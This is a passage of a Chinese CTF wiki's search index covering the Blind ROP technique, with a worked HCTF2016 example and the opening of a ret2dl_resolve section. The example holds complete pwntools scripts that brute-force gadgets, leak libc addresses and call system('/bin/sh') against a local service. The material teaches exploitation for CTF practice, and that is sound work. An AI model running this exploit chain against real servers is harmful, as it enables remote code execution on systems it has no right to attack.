\u6b64\u5916\uff0c\u5bf9\u4e8e\u5927\u591a\u6570plt\u8c03\u7528\u6765\u8bf4\uff0c\u4e00\u822c\u90fd\u4e0d\u5bb9\u6613\u5d29\u6e83\uff0c\u5373\u4f7f\u662f\u4f7f\u7528\u4e86\u6bd4\u8f83\u5947\u602a\u7684\u53c2\u6570\u3002\u6240\u4ee5\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u7cfb\u5217\u7684\u957f\u5ea6\u4e3a16\u7684\u6ca1\u6709\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684\u4ee3\u7801\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4e00\u5b9a\u7684\u7406\u7531\u76f8\u4fe1\u6211\u4eec\u9047\u5230\u4e86plt\u8868\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u524d\u540e\u504f\u79fb6\u5b57\u8282\uff0c\u6765\u5224\u65ad\u6211\u4eec\u662f\u5904\u4e8eplt\u8868\u9879\u4e2d\u95f4\u8fd8\u662f\u8bf4\u5904\u4e8e\u5f00\u5934\u3002", 
            "title": "\u5bfb\u627ePLT"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#rdx", 
            "text": "\u5f53\u6211\u4eec\u627e\u5230plt\u8868\u4e4b\u540e\uff0c\u4e0b\u9762\uff0c\u6211\u4eec\u5c31\u8be5\u60f3\u529e\u6cd5\u6765\u63a7\u5236rdx\u7684\u6570\u503c\u4e86\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u786e\u8ba4strcmp\u7684\u4f4d\u7f6e\u5462\uff1f\u9700\u8981\u63d0\u524d\u8bf4\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528strcmp\u51fd\u6570\uff0c\u6240\u4ee5\u5728\u6ca1\u6709\u8c03\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c31\u5f97\u5229\u7528\u5176\u5b83\u65b9\u5f0f\u6765\u63a7\u5236rdx\u7684\u503c\u4e86\u3002\u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u4e2d\u4f7f\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u3002  \u4e4b\u524d\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop\u7684gadgets\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u51fd\u6570\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u4e86\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u4ee5\u4e0b\u4e24\u79cd\u5730\u5740   readable\uff0c\u53ef\u8bfb\u7684\u5730\u5740\u3002  bad, \u975e\u6cd5\u5730\u5740\uff0c\u4e0d\u53ef\u8bbf\u95ee\uff0c\u6bd4\u5982\u8bf40x0\u3002   \u90a3\u4e48\u6211\u4eec\u5982\u679c\u63a7\u5236\u4f20\u9012\u7684\u53c2\u6570\u4e3a\u8fd9\u4e24\u79cd\u5730\u5740\u7684\u7ec4\u5408\uff0c\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u56db\u79cd\u60c5\u51b5   strcmp(bad,bad)  strcmp(bad,readable)  strcmp(readable,bad)  strcmp(readable,readable)   \u53ea\u6709\u6700\u540e\u4e00\u79cd\u683c\u5f0f\uff0c\u7a0b\u5e8f\u624d\u4f1a\u6b63\u5e38\u6267\u884c\u3002  \u6ce8 \uff1a\u5728\u6ca1\u6709PIE\u4fdd\u62a4\u7684\u65f6\u5019\uff0c64\u4f4d\u7a0b\u5e8f\u7684ELF\u6587\u4ef6\u76840x400000\u5904\u67097\u4e2a\u975e\u96f6\u5b57\u8282\u3002  \u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u5177\u4f53\u5730\u53bb\u505a\u5462\uff1f\u6709\u4e00\u79cd\u6bd4\u8f83\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u4ece\u5934\u5230\u5c3e\u4f9d\u6b21\u626b\u63cf\u6bcf\u4e2aplt\u8868\u9879\uff0c\u4f46\u662f\u8fd9\u4e2a\u5374\u6bd4\u8f83\u9ebb\u70e6\u3002\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u5982\u4e0b\u7684\u4e00\u79cd\u65b9\u6cd5   \u5229\u7528plt\u8868\u9879\u7684\u6162\u8def\u5f84  \u5e76\u4e14\u5229\u7528\u4e0b\u4e00\u4e2a\u8868\u9879\u7684\u6162\u8def\u5f84\u7684\u5730\u5740\u6765\u8986\u76d6\u8fd4\u56de\u5730\u5740   \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u4e0d\u7528\u6765\u56de\u63a7\u5236\u76f8\u5e94\u7684\u53d8\u91cf\u4e86\u3002   \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u80fd\u78b0\u5de7\u627e\u5230strncmp\u6216\u8005strcasecmp\u51fd\u6570\uff0c\u5b83\u4eec\u5177\u6709\u548cstrcmp\u4e00\u6837\u7684\u6548\u679c\u3002", 
            "title": "\u63a7\u5236rdx"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_13", 
            "text": "\u5bfb\u627e\u8f93\u51fa\u51fd\u6570\u65e2\u53ef\u4ee5\u5bfb\u627ewrite\uff0c\u4e5f\u53ef\u4ee5\u5bfb\u627eputs\u3002\u4e00\u822c\u73b0\u5148\u627eputs\u51fd\u6570\u3002\u4e0d\u8fc7\u8fd9\u91cc\u4e3a\u4e86\u4ecb\u7ecd\u65b9\u4fbf\uff0c\u5148\u4ecb\u7ecd\u5982\u4f55\u5bfb\u627ewrite\u3002", 
            "title": "\u5bfb\u627e\u8f93\u51fa\u51fd\u6570"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#writeplt", 
            "text": "\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236write\u51fd\u6570\u7684\u4e09\u4e2a\u53c2\u6570\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u518d\u6b21\u904d\u5386\u6240\u6709\u7684plt\u8868\uff0c\u6839\u636ewrite\u51fd\u6570\u5c06\u4f1a\u8f93\u51fa\u5185\u5bb9\u6765\u627e\u5230\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6709\u4e2a\u6bd4\u8f83\u9ebb\u70e6\u7684\u5730\u65b9\u5728\u4e8e\u6211\u4eec\u9700\u8981\u627e\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u627e\u5230\u8fd9\u4e2a\u503c   \u4f7f\u7528rop chain\uff0c\u540c\u65f6\u4f7f\u5f97\u6bcf\u4e2arop\u5bf9\u5e94\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e0d\u4e00\u6837  \u540c\u65f6\u6253\u5f00\u591a\u4e2a\u8fde\u63a5\uff0c\u5e76\u4e14\u6211\u4eec\u4f7f\u7528\u76f8\u5bf9\u8f83\u9ad8\u7684\u6570\u503c\u6765\u8bd5\u4e00\u8bd5\u3002   \u9700\u8981\u6ce8\u610f\u7684\u662f   linux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002  posix\u6807\u51c6\u6bcf\u6b21\u7533\u8bf7\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6570\u503c\u603b\u662f\u5f53\u524d\u6700\u5c0f\u53ef\u7528\u6570\u503c\u3002   \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u5bfb\u627eputs\u51fd\u6570\u3002", 
            "title": "\u5bfb\u627ewrite@plt"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#putsplt", 
            "text": "\u5bfb\u627eputs\u51fd\u6570(\u8fd9\u91cc\u6211\u4eec\u5bfb\u627e\u7684\u662f plt)\uff0c\u6211\u4eec\u81ea\u7136\u9700\u8981\u63a7\u5236rdi\u53c2\u6570\uff0c\u5728\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop gadget\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u6839\u636ebrop gadget\u504f\u79fb9\u53ef\u4ee5\u5f97\u5230\u76f8\u5e94\u7684gadgets\uff08\u7531ret2libc_csu_init\u4e2d\u540e\u7eed\u53ef\u5f97\uff09\u3002\u540c\u65f6\u5728\u7a0b\u5e8f\u8fd8\u6ca1\u6709\u5f00\u542fPIE\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\uff0c0x400000\u5904\u4e3aELF\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u5176\u5185\u5bb9\u4e3a\\x7fELF\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u8fdb\u884c\u5224\u65ad\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5176payload\u5982\u4e0b  payload =  A *length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)", 
            "title": "\u5bfb\u627eputs@plt"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_14", 
            "text": "\u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5df2\u7ecf\u53ef\u4ee5\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f93\u51fa.text\u6bb5\u66f4\u591a\u7684\u5185\u5bb9\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u5408\u9002gadgets\u3002\u540c\u65f6\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u5176\u5b83\u51fd\u6570\uff0c\u5982dup2\u6216\u8005execve\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u653b\u51fb\u8005\u6b64\u65f6\u4f1a\u53bb\u505a\u4e0b\u4e8b\u60c5   \u5c06socket\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u8f93\u5165\u8f93\u51fa  \u5bfb\u627e\u201c/bin/sh\u201d\u7684\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6700\u597d\u662f\u627e\u5230\u4e00\u5757\u53ef\u5199\u7684\u5185\u5b58\uff0c\u5229\u7528write\u51fd\u6570\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5199\u5230\u76f8\u5e94\u7684\u5730\u5740\u3002  \u6267\u884cexecve\u83b7\u53d6shell\uff0c\u83b7\u53d6execve\u4e0d\u4e00\u5b9a\u5728plt\u8868\u4e2d\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u5c31\u9700\u8981\u60f3\u529e\u6cd5\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u4e86\u3002", 
            "title": "\u653b\u51fb\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_15", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5HCTF2016\u7684\u51fa\u9898\u4eba\u5931\u8e2a\u4e86\u4e3a\u4f8b\uff0c\u76f8\u5173\u7684\u90e8\u7f72\u6587\u4ef6\u90fd\u653e\u5728\u4e86example\u6587\u4ef6\u5939\u4e0b\u7684\u5bf9\u5e94\u76ee\u5f55\u4e0b\u3002\u57fa\u672c\u601d\u8def\u5982\u4e0b", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_16", 
            "text": "def   getbufferflow_length (): \n     i   =   1 \n     while   1 : \n         try : \n             sh   =   remote ( 127.0.0.1 ,   9999 ) \n             sh . recvuntil ( WelCome my friend,Do you know password? \\n ) \n             sh . send ( i   *   a ) \n             output   =   sh . recv () \n             sh . close () \n             if   not   output . startswith ( No password ): \n                 return   i   -   1 \n             else : \n                 i   +=   1 \n         except   EOFError : \n             sh . close () \n             return   i   -   1   \u6839\u636e\u4e0a\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u6808\u6ea2\u51fa\u7684\u957f\u5ea6\u4e3a72\u3002\u540c\u65f6\uff0c\u6839\u636e\u56de\u663e\u4fe1\u606f\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u5f00\u542fcanary\u4fdd\u62a4\uff0c\u5426\u5219\uff0c\u5c31\u4f1a\u6709\u76f8\u5e94\u7684\u62a5\u9519\u5185\u5bb9\u3002\u6240\u4ee5\u6211\u4eec\u4e0d\u9700\u8981\u6267\u884cstack reading\u3002", 
            "title": "\u786e\u5b9a\u6808\u6ea2\u51fa\u957f\u5ea6"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#stop-gadgets_1", 
            "text": "\u5bfb\u627e\u8fc7\u7a0b\u5982\u4e0b  def   get_stop_addr ( length ): \n     addr   =   0x400000 \n     while   1 : \n         try : \n             sh   =   remote ( 127.0.0.1 ,   9999 ) \n             sh . recvuntil ( password? \\n ) \n             payload   =   a   *   length   +   p64 ( addr ) \n             sh . sendline ( payload ) \n             sh . recv () \n             sh . close () \n             print   one success addr: 0x %x   %   ( addr ) \n             return   addr \n         except   Exception : \n             addr   +=   1 \n             sh . close ()   \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c1d\u8bd564\u4f4d\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542fPIE\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u4e00\u822c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684\uff0c\uff0c\uff0c\u5982\u679c\u5f00\u542f\u4e86\uff0c\uff0c\u90a3\u5c31\u6309\u7167\u5f00\u542f\u4e86\u7684\u65b9\u6cd5\u505a\uff0c\uff0c\u7ed3\u679c\u53d1\u73b0\u4e86\u4e0d\u5c11\uff0c\uff0c\u6211\u9009\u62e9\u4e86\u4e00\u4e2a\u8c8c\u4f3c\u8fd4\u56de\u5230\u6e90\u7a0b\u5e8f\u4e2d\u7684\u5730\u5740  one success stop gadget addr: 0x4006b6", 
            "title": "\u5bfb\u627e stop gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#brop-gadgets_1", 
            "text": "\u4e0b\u9762\uff0c\u6211\u4eec\u6839\u636e\u4e0a\u9762\u4ecb\u7ecd\u7684\u539f\u7406\u6765\u5f97\u5230\u5bf9\u5e94\u7684brop gadgets\u5730\u5740\u3002\u6784\u9020\u5982\u4e0b\uff0cget_brop_gadget\u662f\u4e3a\u4e86\u5f97\u5230\u53ef\u80fd\u7684brop gadget\uff0c\u540e\u9762\u7684check_brop_gadget\u662f\u4e3a\u4e86\u68c0\u67e5\u3002  def   get_brop_gadget ( length ,   stop_gadget ,   addr ): \n     try : \n         sh   =   remote ( 127.0.0.1 ,   9999 ) \n         sh . recvuntil ( password? \\n ) \n         payload   =   a   *   length   +   p64 ( addr )   +   p64 ( 0 )   *   6   +   p64 ( \n             stop_gadget )   +   p64 ( 0 )   *   10 \n         sh . sendline ( payload ) \n         content   =   sh . recv () \n         sh . close () \n         print   content \n         # stop gadget returns memory \n         if   not   content . startswith ( WelCome ): \n             return   False \n         return   True \n     except   Exception : \n         sh . close () \n         return   False  def   check_brop_gadget ( length ,   addr ): \n     try : \n         sh   =   remote ( 127.0.0.1 ,   9999 ) \n         sh . recvuntil ( password? \\n ) \n         payload   =   a   *   length   +   p64 ( addr )   +   a   *   8   *   10 \n         sh . sendline ( payload ) \n         content   =   sh . recv () \n         sh . close () \n         return   False \n     except   Exception : \n         sh . close () \n         return   True  ##length = getbufferflow_length()  length   =   72  ##get_stop_addr(length)  stop_gadget   =   0x4006b6  addr   =   0x400740  while   1 : \n     print   hex ( addr ) \n     if   get_brop_gadget ( length ,   stop_gadget ,   addr ): \n         print   possible brop gadget: 0x %x   %   addr \n         if   check_brop_gadget ( length ,   addr ): \n             print   success brop gadget: 0x %x   %   addr \n             break \n     addr   +=   1   \u8fd9\u6837\uff0c\u6211\u4eec\u57fa\u672c\u5f97\u5230\u4e86brop\u7684gadgets\u5730\u57400x4007ba", 
            "title": "\u8bc6\u522bbrop gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#putsplt_1", 
            "text": "\u6839\u636e\u4e0a\u9762\uff0c\u6240\u8bf4\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0bpayload\u6765\u8fdb\u884c\u83b7\u53d6  payload =  A *72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)  \u5177\u4f53\u51fd\u6570\u5982\u4e0b  def   get_puts_addr ( length ,   rdi_ret ,   stop_gadget ): \n     addr   =   0x400000 \n     while   1 : \n         print   hex ( addr ) \n         sh   =   remote ( 127.0.0.1 ,   9999 ) \n         sh . recvuntil ( password? \\n ) \n         payload   =   A   *   length   +   p64 ( rdi_ret )   +   p64 ( 0x400000 )   +   p64 ( \n             addr )   +   p64 ( stop_gadget ) \n         sh . sendline ( payload ) \n         try : \n             content   =   sh . recv () \n             if   content . startswith ( \\x7f ELF ): \n                 print   find puts@plt addr: 0x %x   %   addr \n                 return   addr \n             sh . close () \n             addr   +=   1 \n         except   Exception : \n             sh . close () \n             addr   +=   1   \u6700\u540e\u6839\u636eplt\u7684\u7ed3\u6784\uff0c\u9009\u62e90x400560\u4f5c\u4e3aputs@plt", 
            "title": "\u786e\u5b9aputs@plt\u5730\u5740"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#putsgot", 
            "text": "\u5728\u6211\u4eec\u53ef\u4ee5\u8c03\u7528puts\u51fd\u6570\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732puts\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\uff0c\u4ece\u800c\u83b7\u53d6\u76f8\u5173\u7684system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5730\u5740\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\u6211\u4eec\u4ece0x400000\u5f00\u59cb\u6cc4\u97320x1000\u4e2a\u5b57\u8282\uff0c\u8fd9\u5df2\u7ecf\u8db3\u591f\u5305\u542b\u7a0b\u5e8f\u7684plt\u90e8\u5206\u4e86\u3002\u4ee3\u7801\u5982\u4e0b  def   leak ( length ,   rdi_ret ,   puts_plt ,   leak_addr ,   stop_gadget ): \n     sh   =   remote ( 127.0.0.1 ,   9999 ) \n     payload   =   a   *   length   +   p64 ( rdi_ret )   +   p64 ( leak_addr )   +   p64 ( \n         puts_plt )   +   p64 ( stop_gadget ) \n     sh . recvuntil ( password? \\n ) \n     sh . sendline ( payload ) \n     try : \n         data   =   sh . recv () \n         sh . close () \n         try : \n             data   =   data [: data . index ( \\n WelCome )] \n         except   Exception : \n             data   =   data \n         if   data   ==   : \n             data   =   \\x00 \n         return   data \n     except   Exception : \n         sh . close () \n         return   None  ##length = getbufferflow_length()  length   =   72  ##stop_gadget = get_stop_addr(length)  stop_gadget   =   0x4006b6  ##brop_gadget = find_brop_gadget(length,stop_gadget)  brop_gadget   =   0x4007ba  rdi_ret   =   brop_gadget   +   9  ##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)  puts_plt   =   0x400560  addr   =   0x400000  result   =    while   addr     0x401000 : \n     print   hex ( addr ) \n     data   =   leak ( length ,   rdi_ret ,   puts_plt ,   addr ,   stop_gadget ) \n     if   data   is   None : \n         continue \n     else : \n         result   +=   data \n     addr   +=   len ( data )  with   open ( code ,   wb )   as   f : \n     f . write ( result )   \u6700\u540e\uff0c\u6211\u4eec\u5c06\u6cc4\u9732\u7684\u5185\u5bb9\u5199\u5230\u6587\u4ef6\u91cc\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5982\u679c\u6cc4\u9732\u51fa\u6765\u7684\u662f\u201c\u201d,\u90a3\u8bf4\u660e\u6211\u4eec\u9047\u5230\u4e86'\\x00'\uff0c\u56e0\u4e3aputs\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u662f\u4ee5'\\x00'\u4e3a\u7ec8\u6b62\u7b26\u7684\u3002\u4e4b\u540e\u5229\u7528ida\u6253\u5f00binary\u6a21\u5f0f\uff0c\u9996\u5148\u5728edit- segments- rebase program \u5c06\u7a0b\u5e8f\u7684\u57fa\u5730\u5740\u6539\u4e3a0x400000\uff0c\u7136\u540e\u627e\u5230\u504f\u79fb0x560\u5904\uff0c\u5982\u4e0b  seg000: 0000000000400560                   db   0 FFh  seg000: 0000000000400561                   db    25 h   ; %  seg000 : 0000000000400562                   db   0 B2h   ;   seg000 : 0000000000400563                   db    0 Ah  seg000: 0000000000400564                   db    20 h  seg000: 0000000000400565                   db      0   \u7136\u540e\u6309\u4e0bc,\u5c06\u6b64\u5904\u7684\u6570\u636e\u8f6c\u6362\u4e3a\u6c47\u7f16\u6307\u4ee4\uff0c\u5982\u4e0b  seg000: 0000000000400560   ; ---------------------------------------------------------------------------  seg000: 0000000000400560                   jmp       qword   ptr   cs : 601018 h  seg000: 0000000000400566   ; ---------------------------------------------------------------------------  seg000: 0000000000400566                   push      0  seg000: 000000000040056 B                   jmp       loc_400550  seg000: 000000000040056 B   ; ---------------------------------------------------------------------------   \u8fd9\u8bf4\u660e\uff0cputs@got\u7684\u5730\u5740\u4e3a0x601018\u3002", 
            "title": "\u6cc4\u9732puts@got\u5730\u5740"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_17", 
            "text": "##length = getbufferflow_length()  length   =   72  ##stop_gadget = get_stop_addr(length)  stop_gadget   =   0x4006b6  ##brop_gadget = find_brop_gadget(length,stop_gadget)  brop_gadget   =   0x4007ba  rdi_ret   =   brop_gadget   +   9  ##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)  puts_plt   =   0x400560  ##leakfunction(length, rdi_ret, puts_plt, stop_gadget)  puts_got   =   0x601018  sh   =   remote ( 127.0.0.1 ,   9999 )  sh . recvuntil ( password? \\n )  payload   =   a   *   length   +   p64 ( rdi_ret )   +   p64 ( puts_got )   +   p64 ( puts_plt )   +   p64 ( \n     stop_gadget )  sh . sendline ( payload )  data   =   sh . recvuntil ( \\n WelCome ,   drop = True )  puts_addr   =   u64 ( data . ljust ( 8 ,   \\x00 ))  libc   =   LibcSearcher ( puts ,   puts_addr )  libc_base   =   puts_addr   -   libc . dump ( puts )  system_addr   =   libc_base   +   libc . dump ( system )  binsh_addr   =   libc_base   +   libc . dump ( str_bin_sh )  payload   =   a   *   length   +   p64 ( rdi_ret )   +   p64 ( binsh_addr )   +   p64 ( \n     system_addr )   +   p64 ( stop_gadget )  sh . sendline ( payload )  sh . interactive ()   \u53c2\u8003\u9605\u8bfb   http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/  http://bobao.360.cn/learning/detail/3694.html  http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/", 
            "title": "\u7a0b\u5e8f\u5229\u7528"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/", 
            "text": "\u9ad8\u7ea7ROP\n\n\n\u9ad8\u7ea7ROP\u5176\u5b9e\u548c\u4e00\u822c\u7684ROP\u57fa\u672c\u4e00\u6837\uff0c\u5176\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\u5b83\u5229\u7528\u4e86\u4e00\u4e9b\u66f4\u52a0\u5e95\u5c42\u7684\u539f\u7406\u3002\n\n\nret2_dl_runtime_resolve\n\n\n\u539f\u7406\n\n\n\u8981\u60f3\u5f04\u61c2\u8fd9\u4e2aROP\u5229\u7528\u6280\u5de7\uff0c\u9700\u8981\u9996\u5148\u7406\u89e3ELF\u6587\u4ef6\u7684\u57fa\u672c\u7ed3\u6784\uff0c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7684\u57fa\u672c\u8fc7\u7a0b\uff0c\u8bf7\u53c2\u8003executable\u4e2delf\u5bf9\u5e94\u7684\u4ecb\u7ecd\u3002\u8fd9\u91cc\u6211\u53ea\u7ed9\u51fa\u76f8\u5e94\u7684\u5229\u7528\u65b9\u5f0f\u3002\n\n\n\u6211\u4eec\u77e5\u9053\u5728linux\u4e2d\u662f\u5229\u7528_dl_runtime_resolve(link_map_obj, reloc_index)\u6765\u5bf9\u52a8\u6001\u94fe\u63a5\u7684\u51fd\u6570\u8fdb\u884c\u91cd\u5b9a\u4f4d\u7684\u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u76f8\u5e94\u7684\u53c2\u6570\u4ee5\u53ca\u5176\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u6790\u7684\u51fd\u6570\u4e86\u5462\uff1f\u7b54\u6848\u8fd8\u80af\u5b9a\u7684\u3002\u5177\u4f53\u5229\u7528\u65b9\u5f0f\u5982\u4e0b\n\n\n\n\n\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\n\n\n\u7ed9\u5b9aLink_map\u4ee5\u53caindex\u4e24\u4e2a\u53c2\u6570\u3002\n\n\n\u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7ed9\u5b9a plt0\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u8fd9\u65f6\uff0c\u6211\u4eec\u5c31\u53ea\u9700\u8981\u4e00\u4e2aindex\u5c31\u8db3\u591f\u4e86\u3002\n\n\n\n\n\n\n\u63a7\u5236index\u7684\u5927\u5c0f\uff0c\u4ee5\u4fbf\u4e8e\u6307\u5411\u81ea\u5df1\u6240\u63a7\u5236\u7684\u533a\u57df\uff0c\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u6307\u5b9a\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002\n\n\n\u4f2a\u9020\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f7f\u5f97\u91cd\u5b9a\u4f4d\u8868\u9879\u6240\u6307\u7684\u7b26\u53f7\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002\n\n\n\u4f2a\u9020\u7b26\u53f7\u5185\u5bb9\uff0c\u4f7f\u5f97\u7b26\u53f7\u5bf9\u5e94\u7684\u540d\u79f0\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002\n\n\n\n\n\u6b64\u5916\uff0c\u8fd9\u4e2a\u653b\u51fb\u6210\u529f\u7684\u5f88\u5fc5\u8981\u7684\u6761\u4ef6\n\n\n\n\ndl_resolve\u51fd\u6570\u4e0d\u4f1a\u68c0\u67e5\u5bf9\u5e94\u7684\u7b26\u53f7\u662f\u5426\u8d8a\u754c\uff0c\u5b83\u53ea\u4f1a\u6839\u636e\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u6570\u636e\u6765\u6267\u884c\u3002\n\n\ndl_resolve\u51fd\u6570\u6700\u540e\u7684\u89e3\u6790\u6839\u672c\u4e0a\u4f9d\u8d56\u4e8e\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\n\n\u6ce8\u610f\uff1a\n\n\n\n\n\u7b26\u53f7\u7248\u672c\u4fe1\u606f\n\n\n\u6700\u597d\u4f7f\u5f97ndx = VERSYM[ (reloc-\nr_info) \n 8] \u7684\u503c\u4e3a0\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u627e\u4e0d\u5230\u7684\u60c5\u51b5\u3002\n\n\n\n\n\n\n\u91cd\u5b9a\u4f4d\u8868\u9879\n\n\nr_offset\u5fc5\u987b\u662f\u53ef\u5199\u7684\uff0c\u56e0\u4e3a\u5f53\u89e3\u6790\u5b8c\u51fd\u6570\u540e\uff0c\u5fc5\u987b\u628a\u76f8\u5e94\u51fd\u6570\u7684\u5730\u5740\u586b\u5165\u5230\u5bf9\u5e94\u7684\u5730\u5740\u3002\n\n\n\n\n\n\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u8bf4\u4e86\u8fd9\u4e48\u591a\uff0c\u8fd9\u4e2a\u5229\u7528\u6280\u5de7\u5176\u5b9e\u8fd8\u662fROP\uff0c\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7NX\u548cASLR\u4fdd\u62a4\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a\u653b\u51fb\u66f4\u9002\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u7b80\u5355\u7684\u6808\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u4f46\u540c\u65f6\u53c8\u96be\u4ee5\u6cc4\u9732\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\u3002\n\n\n\u793a\u4f8b\n\n\n\u8fd9\u91cc\u4ee5XDCTF 2015\u7684pwn200\u4e3a\u4f8b\u3002\u4e3b\u8981\u53c2\u8003\n\n\n\n\nhttp://pwn4.fun/2016/11/09/Return-to-dl-resolve/\n 